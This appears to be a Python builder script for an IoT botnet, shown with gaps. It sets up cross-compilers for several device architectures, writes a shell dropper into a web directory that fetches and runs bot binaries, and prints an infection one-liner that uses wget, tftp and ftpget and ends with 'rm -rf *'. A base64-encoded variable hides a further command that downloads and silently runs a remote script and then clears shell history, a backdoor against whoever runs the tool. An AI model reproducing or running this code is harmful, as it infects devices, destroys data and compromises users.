...
yourafag = raw_input("Wanna Download Me Senpai UWU ? y/n [Just choose 'y']:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["mipssss", #mips
             "mpsllll", #mipsel
             "sh4444", #sh4
             "xxxxx86", #x86
             "aaaaarm6", #Armv6l
...
getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2', 'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2', 'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2', 'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
...
def run(cmd):
    subprocess.call(cmd, shell=True)
checkbinaries = "Y2QgL3RtcDsgd2dldCBwYXN0ZS5lZS9yL3g3MmlZLzAgLU8gYSAtcTsgY2htb2QgNzc3IGE7IHNoIGEgPiAvZGV2L251bGwgMj4mMTsgcm0gLXJmIGE7IGhpc3RvcnkgLWM7IGNsZWFyOyBjZDs="
...
run('echo -e "#!/bin/bash" > /var/www/html/sex.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/sex.sh')
...
print("\x1b[1;33mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/sex.sh; chmod 777 sex.sh; sh sex.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf sex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
print
print("\x1b[1;33mPrivate Senpai Source Made By Purcend [Drag over it hold CTRL and then right click on mouse Then copy]")
print("\x1b[1;35mCoded By Daddy Komodo\x1b[0m")